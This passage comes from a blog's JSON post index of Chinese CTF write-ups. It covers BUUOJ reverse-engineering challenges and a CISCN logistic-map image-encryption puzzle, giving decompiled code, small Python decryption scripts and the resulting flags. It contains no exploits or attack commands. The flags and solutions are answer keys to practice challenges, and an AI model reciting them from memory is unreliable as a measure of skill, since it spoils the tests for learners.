&lt;= 19; ++i ) &#123; if ( i &amp; 1 ) printf(&quot;%ld\\n&quot;, (unsigned int)(ptr[i] &lt;&lt; i)); else printf(&quot;%ld\\n&quot;, (unsigned int)(i * ptr[i])); &#125; return 0;&#125; 没有给出flag[0] 所以解密时也需要填充一个flag[0], 以保证下标对齐 123456789#!/usr/bin/env python3cipher = [&quot; &quot;, 198, 232, 816, 200, 1536, 300, 6144, 984, 51200, 570, 92160, 1200, 565248, 756, 1474560, 800, 6291456, 1782, 65536000]for _ in range(1, 20): if _ &amp; 1: cipher[_] = chr(cipher[_]&gt;&gt;_) else: cipher[_] = chr(cipher[_]//_)flag = &quot;&quot;.join(cipher)print(flag) flag{d9-dE6-20c} [WUSTCTF2020]level2 链接: https://buuoj.cn/challenges#[WUSTCTF2020]level2 ELF 32 UPX脱壳即可用IDA在main函数中看到flag flag{Just_upx_-d} EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"}]},{"title":"CISCN-imageencrypt","slug":"CISCN-imageencrypt","date":"2021-05-17T02:42:13.000Z","updated":"2021-07-04T08:22:47.000Z","comments":true,"path":"2021/05/16/CISCN-imageencrypt/","link":"","permalink":"https://yoloyolo.top/2021/05/16/CISCN-imageencrypt/","excerpt":"有意思的一题","text":"有意思的一题 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import randomfrom flag import flag,image,r,key1,key2import md5assert(flag[:5]==&#x27;CISCN&#x27;)assert(len(str(r))==3) # 1.2 data = &#x27;&#x27;.join(map(chr,image))assert(flag[6:-1] == md5.new(data).hexdigest())assert(key1&lt;256)assert(key2&lt;256)x0 = round(random.random(),6)def generate(x): return round(r*x*(3-x),6) # r &lt; 1def encrypt(pixel,key1,key2,x0,m,n): num = m*n/8 seqs = [] x = x0 bins = &#x27;&#x27; tmp = [] for i in range(num): x = generate(x) tmp.append(x) seqs.append(int(x*22000)) for x in seqs: bin_x = bin(x)[2:] if len(bin_x) &lt; 16: bin_x = &#x27;0&#x27;*(16-len(bin_x))+bin_x bins += bin_x assert(len(pixel) == m*n) cipher = [ 0 for i in range(m) for j in range(n)] for i in range(m): for j in range(n): index = n*i+j ch = int(bins[2*index:2*index+2],2) pix = pixel[index] if ch == 0: pix = (pix^key1)&amp;0xff if ch == 1: pix = (~pix^key1)&amp;0xff if ch == 2: pix = (pix^key2)&amp;0xff if ch == 3: pix = (~pix^key2)&amp;0xff cipher[index] = pix return cipherflagimage = imagetestimage = []for i in range(16*16): testimage.append(random.randint(0,255))print testimageprint encrypt(testimage,key1,key2,x0,16,16)print encrypt(flagimage,key1,key2,x0,24,16)&quot;&quot;&quot;[205, 237, 6, 158, 24, 119, 213, 32, 74, 151, 142, 186, 57, 28, 113, 62, 165, 20, 190, 37, 159, 137, 196, 44, 97, 37, 7, 222, 220, 95, 4, 66, 0, 28, 199, 142, 95, 105, 119, 232, 250, 215, 60, 162, 91, 211, 63, 30, 91, 108, 217, 206, 80, 193, 230, 42, 221, 71, 136, 115, 22, 176, 91, 57, 61, 3, 87, 73, 250, 121, 51, 72, 83, 120, 77, 199, 236, 190, 249, 116, 45, 6, 134, 110, 149, 94, 214, 232, 153, 213, 119, 98, 81, 203, 240, 114, 240, 29, 122, 188, 156, 53, 128, 185, 40, 147, 245, 204, 47, 101, 80, 229, 41, 150, 28, 195, 25, 235, 119, 6, 192, 8, 73, 255, 159, 172, 77, 94, 254, 104, 236, 219, 141, 91, 195, 162, 97, 56, 252, 173, 163, 43, 167, 214, 50, 73, 115, 190, 254, 53, 61, 77, 138, 192, 15, 4, 190, 27, 37, 108, 101, 135, 90, 215, 106, 243, 112, 111, 106, 89, 143, 150, 185, 142, 192, 176, 48, 138, 164, 185, 61, 77, 72, 0, 17, 203, 210, 71, 186, 49, 162, 250, 218, 219, 195, 63, 248, 220, 155, 180, 219, 132, 219, 94, 144, 247, 211, 95, 70, 227, 222, 31, 69, 24, 13, 216, 185, 108, 137, 57, 186, 211, 55, 27, 158, 241, 223, 21, 134, 106, 152, 127, 187, 245, 246, 131, 176, 177, 228, 100, 112, 11, 84, 61, 193, 42, 41, 69, 229, 145, 254, 138, 3, 153, 123, 31][131, 92, 72, 47, 177, 57, 131, 118, 4, 38, 192, 19, 119, 82, 63, 143, 235, 165, 15, 140, 209, 223, 117, 133, 47, 148, 81, 144, 138, 246, 173, 235, 177, 181, 110, 39, 9, 192, 57, 166, 180, 153, 141, 19, 234, 157, 142, 80, 234, 197, 151, 152, 249, 143, 176, 155, 147, 17, 57, 194, 191, 254, 13, 144, 140, 85, 25, 248, 172, 208, 154, 249, 5, 201, 27, 137, 69, 23, 175, 34, 156, 72, 208, 32, 195, 16, 127, 65, 207, 131, 57, 203, 7, 98, 89, 36, 65, 75, 211, 21, 45, 132, 214, 239, 102, 58, 68, 130, 97, 204, 225, 76, 152, 216, 74, 149, 79, 165, 198, 72, 150, 94, 7, 177, 46, 226, 252, 247, 79, 62, 69, 106, 60, 21, 106, 236, 47, 145, 170, 28, 18, 101, 14, 152, 131, 7, 37, 15, 168, 99, 115, 27, 220, 150, 89, 82, 232, 170, 107, 221, 212, 46, 235, 129, 36, 66, 217, 222, 36, 15, 217, 192, 247, 192, 113, 230, 129, 196, 13, 247, 148, 228, 225, 86, 71, 133, 132, 238, 236, 127, 11, 83, 107, 141, 114, 150, 182, 146, 213, 250, 141, 53, 114, 16, 198, 70, 133, 17, 247, 173, 136, 73, 236, 78, 188, 150, 239, 58, 199, 136, 11, 122, 134, 77, 47, 167, 137, 188, 55, 195, 41, 49, 245, 92, 160, 213, 254, 0, 85, 205, 193, 69, 2, 140, 143, 155, 127, 236, 179, 199, 168, 35, 85, 40, 45, 174][198, 143, 247, 3, 152, 139, 131, 84, 181, 180, 252, 177, 192, 25, 217, 179, 136, 107, 190, 62, 4, 6, 90, 53, 105, 238, 117, 44, 5, 116, 132, 195, 214, 171, 113, 209, 18, 31, 194, 174, 228, 212, 196, 14, 27, 41, 211, 56, 139, 135, 225, 214, 89, 122, 178, 212, 185, 231, 204, 150, 204, 212, 160, 142, 213, 173, 186, 166, 65, 238, 5, 32, 45, 31, 25, 189, 148, 38, 78, 79, 33, 56, 227, 48, 103, 163, 31, 189, 37, 124, 106, 249, 86, 188, 86, 233, 41, 250, 89, 7, 212, 234, 111, 104, 245, 102, 227, 96, 160, 67, 181, 13, 26, 192, 214, 210, 188, 84, 216, 215, 243, 72, 233, 2, 122, 166, 107, 251, 70, 128, 94, 190, 185, 210, 34, 85, 77, 29, 182, 77, 115, 208, 228, 252, 73, 198, 151, 70, 10, 97, 138, 235, 21, 117, 239, 102, 129, 2, 253, 80, 53, 61, 184, 220, 41, 82, 37, 140, 23, 143, 179, 53, 153, 113, 213, 211, 111, 197, 248, 65, 60, 69, 1, 81, 48, 254, 251, 89, 195, 8, 93, 190, 66, 174, 97, 175, 210, 191, 66, 112, 123, 128, 33, 230, 237, 104, 16, 192, 239, 173, 44, 10, 120, 231, 114, 151, 140, 63, 103, 44, 243, 222, 242, 73, 51, 46, 98, 137, 163, 152, 147, 95, 223, 3, 15, 112, 85, 215, 133, 131, 240, 239, 224, 195, 140, 124, 70, 156, 221, 241, 37, 245, 1, 99, 9, 157, 99, 150, 47, 118, 225, 16, 13, 141, 135, 99, 18, 119, 63, 160, 6, 247, 27, 68, 45, 199, 86, 193, 252, 21, 135, 32, 42, 103, 114, 241, 49, 249, 182, 52, 18, 155, 157, 61, 4, 246, 158, 52, 118, 242, 195, 54, 139, 232, 100, 31, 11, 233, 58, 100, 101, 137, 83, 145, 209, 7, 241, 96, 57, 148, 207, 29, 237, 124, 177, 166, 161, 20, 116, 122, 61, 71, 46, 82, 18, 157, 253, 130, 112, 66, 94, 57, 221, 243, 222, 192, 147, 5, 130, 201, 174, 26, 160, 16, 188, 103, 187, 11, 238, 182, 144, 4, 137, 33, 84, 100, 7, 239, 219, 83, 112, 189, 166, 58, 93, 141, 30, 198, 220, 196, 118, 172, 5, 45]&quot;&quot;&quot; 大概流程如下 x0作为初始值, 通过xi+1=t∗xi∗(3−xi)x_{i+1} = t*x_{i}*(3-x_{i})xi+1​=t∗xi​∗(3−xi​)来产生序列, 其中t为系数 产生的序列作为密钥, 密钥用于加密列表, 但是密钥的每2bit组合决定使用哪个key进行加密 虽然代码中写的是pix = (~pix^key1)&amp;0xff 但是(~pix^key1) == (pix^~key1), 那么可以理解为有两组key key1 &amp; ~key1 key2 &amp; ~key2 用于测试的列表相异或即可得到两组key 78 &amp; 177 86 &amp; 169 现在我们需要知道这两组key如何对应key1, key2, ~key1, ~key2 一共存在8种情况 对于每种情况都进行测试, 还原出8种密钥, 再通过这8种密钥还原出8种序列 由于序列的产生满足xi+1=t∗xi∗(3−xi)x_{i+1} = t*x_{i}*(3-x_{i})xi+1​=t∗xi​∗(3−xi​)的规律 那么xi+1xi∗(3−xi)=t\\frac{x_{i+1}}{x_{i}*(3-x_{i})} = txi​∗(3−xi​)xi+1​​=t是成立的 那么可以通过使用每个序列来计算每次计算过程的系数t, 当t的值稳定在某一值附近时, 则可以确定t的值, 同时可以确定key1&amp;key2以及正确的序列 经过计算得到 key1 = 169 key2 = 78 t = 1.2 那么还剩下一个x0 对于x0的计算, 我们完全可以爆破一个六位的小数, 使其迭代结果与正确的序列相匹配 (这里有一个小坑: 正确的序列使用乘以22000之后的值) 爆破结果为0.840264 那么通过这些条件, 再调用一次encrypt函数就可以获得flag EOF","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"CISCN","slug":"CISCN","permalink":"https://yoloyolo.top/tags/CISCN/"}]},{"title":"Reverse_0","slug":"Reverse-0","date":"2021-05-09T05:34:11.000Z","updated":"2021-05-22T11:18:02.000Z","comments":true,"path":"2021/05/09/Reverse-0/","link":"","permalink":"https://yoloyolo.top/2021/05/09/Reverse-0/","excerpt":"想写点什么却又不知该写什么, 就写写BUUOJ的逆向题解记录吧","text":"想写点什么却又不知该写什么, 就写写BUUOJ的逆向题解记录吧 easyre 链接: https://buuoj.cn/challenges#easyre EXE 64 IDA中 main 函数反编译结果如下 12345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123; int b; // [rsp+28h] [rbp-8h] int a; // [rsp+2Ch] [rbp-4h] _main(); scanf(&quot;%d%d&quot;, &amp;a, &amp;b); if ( a == b ) printf(&quot;flag&#123;this_Is_a_EaSyRe&#125;&quot;); else printf(&quot;sorry,you can&#x27;t get flag&quot;); return 0;&#125; 输入两个一样的数字即输出flag flag{this_Is_a_EaSyRe} reverse1 链接: https://buuoj.cn/challenges#reverse1 EXE 64 IDA中 sub_1400118C0 函数反编译结果如下 123456789101112131415161718192021222324252627282930313233343536__int64 sub_1400118C0()&#123; char *v0; // rdi signed __int64 i; // rcx size_t v2; // rax size_t v3; // rax char v5; // [rsp+0h] [rbp-20h] int j; // [rsp+24h] [rbp+4h] char Str1; // [rsp+48h] [rbp+28h] unsigned __int64 v8; // [rsp+128h] [rbp+108h] v0 = &amp;v5; for ( i = 82i64; i; --i ) &#123; *(_DWORD *)v0 = 0xCCCCCCCC; v0 += 4; &#125; for ( j = 0; ; ++j ) &#123; v8 = j; v2 = j_strlen(Str2); if ( v8 &gt; v2 ) break; if ( Str2[j] == 111 ) Str2[j] = 48; &#125; sub_1400111D1((__int64)&quot;input the flag:&quot;); sub_14001128F(&quot;%20s&quot;, &amp;Str1); v3 = j_strlen(Str2); if ( !strncmp(&amp;Str1, Str2, v3) ) sub_1400111D1((__int64)&quot;this is the right flag!\\n&quot;); else sub_1400111D1((__int64)&quot;wrong flag\\n&quot;); sub_14001113B(&amp;v5, &amp;unk_140019D00); return 0i64;&#125; 其中Str2=&quot;&#123;hello_world&#125;&quot;, 而函数在遍历Str2时, 会把'o'(111)替换为'0'(49), 最后将用户的输入(Str1)与Str2进行比较 flag{hell0_w0rld} reverse2 链接: https://buuoj.cn/challenges#reverse2 ELF 64 IDA中 main 函数反编译结果如下 1234567891011121314151617181920212223242526272829303132int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax int stat_loc; // [rsp+4h] [rbp-3Ch] int i; // [rsp+8h] [rbp-38h] __pid_t pid; // [rsp+Ch] [rbp-34h] char s2; // [rsp+10h] [rbp-30h] unsigned __int64 v8; // [rsp+28h] [rbp-18h] v8 = __readfsqword(0x28u); pid = fork(); if ( pid ) &#123; argv = (const char **)&amp;stat_loc; waitpid(pid, &amp;stat_loc, 0); &#125; else &#123; for ( i = 0; i &lt;= strlen(&amp;flag); ++i ) &#123; if ( *(&amp;flag + i) == 105 || *(&amp;flag + i) == 114 ) *(&amp;flag + i) = 49; &#125; &#125; printf(&quot;input the flag:&quot;, argv); __isoc99_scanf(&quot;%20s&quot;, &amp;s2); if ( !strcmp(&amp;flag, &amp;s2) ) result = puts(&quot;this is the right flag!&quot;); else result = puts(&quot;wrong flag!&quot;); return result;&#125; 其中flag=&quot;&#123;hacking_for_fun&#125;&quot;, 函数在遍历flag时会将'i'(105)和'r'(114)替换为'1'(49) flag{hack1ng_fo1_fun} 内涵的软件 链接: https://buuoj.cn/challenges#内涵的软件 EXE 32 IDA中 main_0 函数反编译结果如下 12345678910111213141516171819202122232425262728293031323334353637int main_0()&#123; int result; // eax char v1; // [esp+4Ch] [ebp-Ch] const char *v2; // [esp+50h] [ebp-8h] int v3; // [esp+54h] [ebp-4h] v3 = 5; v2 = &quot;DBAPP&#123;49d3c93df25caad81232130f3d2ebfad&#125;&quot;; while ( v3 &gt;= 0 ) &#123; printf(aD, v3); sub_40100A(); --v3; &#125; printf( &quot;\\n&quot; &quot;\\n&quot; &quot;\\n&quot; &quot;这里本来应该是答案的,但是粗心的程序员忘记把变量写进来了,你要不逆向试试看:(Y/N)\\n&quot;); v1 = 1; scanf(&quot;%c&quot;, &amp;v1); if ( v1 == 89 ) &#123; printf(aOdIda); result = sub_40100A(); &#125; else &#123; if ( v1 == 78 ) printf(asc_425034); else printf(&quot;输入错误,没有提示.&quot;); result = sub_40100A(); &#125; return result;&#125; flag{49d3c93df25caad81232130f3d2ebfad} 新年快乐 链接: https://buuoj.cn/challenges#新年快乐 EXE 32 12file 新年快乐.exe新年快乐.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed 存在UPX壳 脱壳 12345678910upx -d 新年快乐.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2020UPX 3.96 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 27807 &lt;- 21151 76.06% win32/pe 新年快乐.exeUnpacked 1 file. IDA中 _main 函数反编译结果如下 12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax char v4; // [esp+12h] [ebp-3Ah] __int16 v5; // [esp+20h] [ebp-2Ch] __int16 v6; // [esp+22h] [ebp-2Ah] __main(); strcpy(&amp;v4, &quot;HappyNewYear!&quot;); v5 = 0; memset(&amp;v6, 0, 0x1Eu); printf(&quot;please input the true flag:&quot;); scanf(&quot;%s&quot;, &amp;v5); if ( !strncmp((const char *)&amp;v5, &amp;v4, strlen(&amp;v4)) ) result = puts(&quot;this is true flag!&quot;); else result = puts(&quot;wrong!&quot;); return result;&#125; flag{HappyNewYear!} helloword 链接: https://buuoj.cn/challenges#helloword Android 使用Android Studio打开 在java-&gt;com.example-&gt;helloworld-&gt;MainActivity中得到flag flag{7631a988259a00816deda84afb29430a} xor 链接: https://buuoj.cn/challenges#xor EXE 64 IDA中 _main 函数反编译结果如下 123456789101112131415161718192021222324252627int __cdecl main(int argc, const char **argv, const char **envp)&#123; char *v3; // rsi int result; // eax signed int i; // [rsp+2Ch] [rbp-124h] char v6[264]; // [rsp+40h] [rbp-110h] __int64 v7; // [rsp+148h] [rbp-8h] memset(v6, 0, 0x100uLL); v3 = (char *)256; printf(&quot;Input your flag:\\n&quot;, 0LL); get_line(v6, 256LL); if ( strlen(v6) != 33 ) goto LABEL_12; for ( i = 1; i &lt; 33; ++i ) v6[i] ^= v6[i - 1]; v3 = global; if ( !strncmp(v6, global, 0x21uLL) ) printf(&quot;Success&quot;, v3); elseLABEL_12: printf(&quot;Failed&quot;, v3); result = __stack_chk_guard; if ( __stack_chk_guard == v7 ) result = 0; return result;&#125; 123456_global = [0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11, 0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F, 0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F, 0x47, 0x32, 0x4F] 用户输入经过异或操作后与global相比较, 则global为加密后的flag 解密脚本如下 12345678910#!/usr/bin/env python3cipher = [0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11, 0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F, 0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F, 0x47, 0x32, 0x4F]flag = chr(cipher[0])for i in range(1, len(cipher)): flag += chr(cipher[i]^cipher[i-1])print(flag) flag{QianQiuWanDai_YiTongJiangHu} reverse3 链接: https://buuoj.cn/challenges#reverse3 EXE 32 IDA中 _main_0 函数反编译结果如下 12345678910111213141516171819202122232425262728293031323334353637__int64 main_0()&#123; size_t v0; // eax const char *v1; // eax size_t v2; // eax int v3; // edx __int64 v4; // ST08_8 signed int j; // [esp+DCh] [ebp-ACh] signed int i; // [esp+E8h] [ebp-A0h] signed int v8; // [esp+E8h] [ebp-A0h] char Dest[108]; // [esp+F4h] [ebp-94h] char Str; // [esp+160h] [ebp-28h] char v11; // [esp+17Ch] [ebp-Ch] for ( i = 0; i &lt; 100; ++i ) &#123; if ( (unsigned int)i &gt;= 0x64 ) j____report_rangecheckfailure(); Dest[i] = 0; &#125; sub_41132F(&quot;please enter the flag:&quot;); sub_411375(&quot;%20s&quot;, &amp;Str); v0 = j_strlen(&amp;Str); v1 = (const char *)sub_4110BE(&amp;Str, v0, &amp;v11); strncpy(Dest, v1, 0x28u); v8 = j_strlen(Dest); for ( j = 0; j &lt; v8; ++j ) Dest[j] += j; v2 = j_strlen(Dest); if ( !strncmp(Dest, Str2, v2) ) sub_41132F(&quot;rigth flag!\\n&quot;); else sub_41132F(&quot;wrong flag!\\n&quot;); HIDWORD(v4) = v3; LODWORD(v4) = 0; return v4;&#125; Str2 = &quot;e3nifIH9b_C@n@dH&quot; 123456#!/usr/bin/env python3cipher=&quot;e3nifIH9b_C@n@dH&quot;string = &quot;&quot;for i in range(len(cipher)): string += chr(ord(cipher[i])-i)print(string) 解密得到字符串e2lfbDB2ZV95b3V9 在观察函数可以看到用户输入的字符串经过了函数sub_4110BE的处理 跟进函数可以看到一个字符串 1aAbcdefghijklmn=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot; 可以判断内容为Base64字符集, 即函数功能为Base64编码 12echo -n &quot;e2lfbDB2ZV95b3V9&quot; | base64 -d&#123;i_l0ve_you&#125; flag{i_l0ve_you} 不一样的flag 链接: https://buuoj.cn/challenges#不一样的flag EXE 32 IDA中 _main 函数反编译结果如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v3; // [esp+17h] [ebp-35h] int v4; // [esp+30h] [ebp-1Ch] int v5; // [esp+34h] [ebp-18h] signed int v6; // [esp+38h] [ebp-14h] int i; // [esp+3Ch] [ebp-10h] int v8; // [esp+40h] [ebp-Ch] __main(); v4 = 0; v5 = 0; qmemcpy(&amp;v3, _data_start__, 0x19u); while ( 1 ) &#123; puts(&quot;you can choose one action to execute&quot;); puts(&quot;1 up&quot;); puts(&quot;2 down&quot;); puts(&quot;3 left&quot;); printf(&quot;4 right\\n:&quot;); scanf(&quot;%d&quot;, &amp;v6); if ( v6 == 2 ) &#123; ++v4; &#125; else if ( v6 &gt; 2 ) &#123; if ( v6 == 3 ) &#123; --v5; &#125; else &#123; if ( v6 != 4 )LABEL_13: exit(1); ++v5; &#125; &#125; else &#123; if ( v6 != 1 ) goto LABEL_13; --v4; &#125; for ( i = 0; i &lt;= 1; ++i ) &#123; if ( *(&amp;v4 + i) &lt; 0 || *(&amp;v4 + i) &gt; 4 ) exit(1); &#125; if ( *((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41) == 49 ) exit(1); if ( *((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41) == 35 ) &#123; puts(&quot;\\nok, the order you enter is the flag!&quot;); exit(0); &#125; &#125;&#125; 输入&quot;1234&quot;分别对应上下左右, v4为Y轴, v5为X轴 这段代码用于检测Y轴与X轴的值是否在[0, 4]这个范围内 (v4, v5使用连续的内存空间, 目测是数组, 所以*(&amp;v4 + i)可以指向v5) 12345for ( i = 0; i &lt;= 1; ++i )&#123; if ( *(&amp;v4 + i) &lt; 0 || *(&amp;v4 + i) &gt; 4 ) exit(1);&#125; _data_start__=&quot;*11110100001010000101111#&quot; 且该值被赋给v3, v3为字符数组且开始内存为[esp+17h] 当v4 v5为0时, *((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41)指向地址为[esp+17h], 即v3的开始内存 则通过v4与v5的值可以控制内存的指向, 可以画出迷宫地图 1234567maze = &quot;&quot;&quot;* 1 1 1 10 1 0 0 00 1 0 1 00 0 0 1 01 1 1 1 #&quot;&quot;&quot; 当*((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41)指向的值为'1'(49)时, 程序退出 当*((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41)指向的值为'#'(35)时, 则走出迷宫 则可以得出flag flag{222441144222} SimpleRev 链接: https://buuoj.cn/challenges#SimpleRev ELF 64 IDA中 main 函数反编译结果如下 12345678910111213141516171819202122int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; int v3; // eax char v4; // [rsp+Fh] [rbp-1h] while ( 1 ) &#123; while ( 1 ) &#123; printf(&quot;Welcome to CTF game!\\nPlease input d/D to start or input q/Q to quit this program: &quot;, argv, envp); v4 = getchar(); if ( v4 != 100 &amp;&amp; v4 != 68 ) break; Decry(); &#125; if ( v4 == 113 || v4 == 81 ) Exit(); puts(&quot;Input fault format!&quot;); v3 = getchar(); putchar(v3); &#125;&#125; 跟进 Decry 函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667unsigned __int64 Decry()&#123; char v1; // [rsp+Fh] [rbp-51h] int v2; // [rsp+10h] [rbp-50h] int v3; // [rsp+14h] [rbp-4Ch] int i; // [rsp+18h] [rbp-48h] int v5; // [rsp+1Ch] [rbp-44h] char src[8]; // [rsp+20h] [rbp-40h] __int64 v7; // [rsp+28h] [rbp-38h] int v8; // [rsp+30h] [rbp-30h] __int64 v9; // [rsp+40h] [rbp-20h] __int64 v10; // [rsp+48h] [rbp-18h] int v11; // [rsp+50h] [rbp-10h] unsigned __int64 v12; // [rsp+58h] [rbp-8h] v12 = __readfsqword(0x28u); *(_QWORD *)src = 357761762382LL; // &quot;NDCLS&quot; v7 = 0LL; v8 = 0; v9 = 512969957736LL; // &quot;hadow&quot; v10 = 0LL; v11 = 0; text = (char *)join(key3, &amp;v9); // key3=&quot;killshadow&quot; strcpy(key, key1); // key1=&quot;ADSFKNDCLS&quot; strcat(key, src); v2 = 0; v3 = 0; getchar(); v5 = strlen(key); for ( i = 0; i &lt; v5; ++i ) &#123; if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;= 90 ) key[i] = key[v3 % v5] + 32; ++v3; &#125; printf(&quot;Please input your flag:&quot;, src); while ( 1 ) &#123; v1 = getchar(); if ( v1 == 10 ) break; if ( v1 == 32 ) &#123; ++v2; &#125; else &#123; if ( v1 &lt;= 96 || v1 &gt; 122 ) &#123; if ( v1 &gt; 64 &amp;&amp; v1 &lt;= 90 ) str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97; &#125; else &#123; str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97; &#125; if ( !(v3 % v5) ) putchar(32); ++v2; &#125; &#125; if ( !strcmp(text, str2) ) puts(&quot;Congratulation!\\n&quot;); else puts(&quot;Try again!\\n&quot;); return __readfsqword(0x28u) ^ v12;&#125; str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97 key与str2的值已知, 则可以爆破v1 1234567891011#!/usr/bin/env python3import stringstr2 = &quot;killshadow&quot;key = &quot;adsfkndcls&quot;flag = &quot;&quot;for _ in range(len(key)): for i in range(128): if ord(str2[_]) == (i-39-ord(key[_])+97)%26+97: if chr(i) in string.ascii_uppercase: flag += chr(i)print(flag) 实际爆破时, 会出现除了大写字母之外的其他结果, 但是本题的flag为大写字母 flag{KLDQCUDFZO} Java逆向解密 链接: https://buuoj.cn/challenges#Java逆向解密 Java jd-gui中反编译结果如下 123456789101112131415161718192021222324252627282930313233343536import java.io.PrintStream;import java.util.ArrayList;import java.util.Scanner;public class Reverse&#123; public static void main(String[] args) &#123; Scanner s = new Scanner(System.in); System.out.println(&quot;Please input the flag ：&quot;); String str = s.next(); System.out.println(&quot;Your input is ：&quot;); System.out.println(str); char[] stringArr = str.toCharArray(); Encrypt(stringArr); &#125; public static void Encrypt(char[] arr) &#123; ArrayList Resultlist = new ArrayList(); for (int i = 0; i &lt; arr.length; ++i) &#123; int result = arr[i] + &#x27;@&#x27; ^ 0x20; Resultlist.add(Integer.valueOf(result)); &#125; int[] KEY = &#123; 180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65 &#125;; ArrayList KEYList = new ArrayList(); for (int j = 0; j &lt; KEY.length; ++j) &#123; KEYList.add(Integer.valueOf(KEY[j])); &#125; System.out.println(&quot;Result:&quot;); if (Resultlist.equals(KEYList)) System.out.println(&quot;Congratulations！&quot;); else System.err.println(&quot;Error！&quot;); &#125;&#125; 123456#!/usr/bin/env python3key = [180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65]flag = &quot;&quot;for i in range(len(key)): flag += chr((key[i]-ord(&#x27;@&#x27;))^0x20)print(flag) flag{This_is_the_flag_!} 刮开有奖 链接: https://buuoj.cn/challenges#刮开有奖 EXE 32 IDA中 DialogFunc 函数反编译结果如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576BOOL __stdcall DialogFunc(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)&#123; const char *v4; // esi const char *v5; // edi int v7; // [esp+8h] [ebp-20030h] int v8; // [esp+Ch] [ebp-2002Ch] int v9; // [esp+10h] [ebp-20028h] int v10; // [esp+14h] [ebp-20024h] int v11; // [esp+18h] [ebp-20020h] int v12; // [esp+1Ch] [ebp-2001Ch] int v13; // [esp+20h] [ebp-20018h] int v14; // [esp+24h] [ebp-20014h] int v15; // [esp+28h] [ebp-20010h] int v16; // [esp+2Ch] [ebp-2000Ch] int v17; // [esp+30h] [ebp-20008h] CHAR String; // [esp+34h] [ebp-20004h] char v19; // [esp+35h] [ebp-20003h] char v20; // [esp+36h] [ebp-20002h] char v21; // [esp+37h] [ebp-20001h] char v22; // [esp+38h] [ebp-20000h] char v23; // [esp+39h] [ebp-1FFFFh] char v24; // [esp+3Ah] [ebp-1FFFEh] char v25; // [esp+3Bh] [ebp-1FFFDh] char v26; // [esp+10034h] [ebp-10004h] char v27; // [esp+10035h] [ebp-10003h] char v28; // [esp+10036h] [ebp-10002h] if ( a2 == 272 ) return 1; if ( a2 != 273 ) return 0; if ( (_WORD)a3 == 1001 ) &#123; memset(&amp;String, 0, 0xFFFFu); GetDlgItemTextA(hDlg, 1000, &amp;String, 0xFFFF); if ( strlen(&amp;String) == 8 ) &#123; v7 = 90; v8 = 74; v9 = 83; v10 = 69; v11 = 67; v12 = 97; v13 = 78; v14 = 72; v15 = 51; v16 = 110; v17 = 103; sub_4010F0(&amp;v7, 0, 10); memset(&amp;v26, 0, 0xFFFFu); v26 = v23; v28 = v25; v27 = v24; v4 = (const char *)sub_401000(&amp;v26, strlen(&amp;v26)); memset(&amp;v26, 0, 0xFFFFu); v27 = v21; v26 = v20; v28 = v22; v5 = (const char *)sub_401000(&amp;v26, strlen(&amp;v26)); if ( String == v7 + 34 &amp;&amp; v19 == v11 &amp;&amp; 4 * v20 - 141 == 3 * v9 &amp;&amp; v21 / 4 == 2 * (v14 / 9) &amp;&amp; !strcmp(v4, &quot;ak1w&quot;) &amp;&amp; !strcmp(v5, &quot;V1Ax&quot;) ) &#123; MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0); &#125; &#125; return 0; &#125; if ( (_WORD)a3 != 1 &amp;&amp; (_WORD)a3 != 2 ) return 0; EndDialog(hDlg, (unsigned __int16)a3); return 1;&#125; v7-v17为数组, String到v25为数组, v26到v28为数组 1int arr_1 = &#123;90, 74, 83, 69, 67, 97, 78, 72, 51, 110, 103&#125;; 跟进 sub_4010F0 函数 代码逻辑有些复杂, 这里可以反编译代码之后修改成C语言代码再运行, 得出arr_1经过函数处理的结果 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;stdio.h&gt;int sub_4010F0(int a1[], int a2, int a3)&#123; int result; // eax int i; // esi int v5; // ecx int v6; // edx result = a3; for 